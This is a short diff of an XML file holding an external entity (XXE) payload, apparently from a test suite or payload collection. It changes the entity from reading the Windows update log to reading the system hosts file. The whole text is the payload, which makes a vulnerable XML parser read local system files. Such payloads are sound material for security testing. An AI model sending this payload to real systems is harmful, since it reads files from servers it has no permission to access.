@@ -1,5 +1,7 @@
-<?xml version="1.0" encoding="ISO-8859-1"?>
+<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE data [
-<!ENTITY xxe SYSTEM "file:///C:/Windows/WindowsUpdate.log">
+    <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
 ]>
-<data>&xxe;</data> 
+<data>
+    <content>&xxe;</content>
+</data>
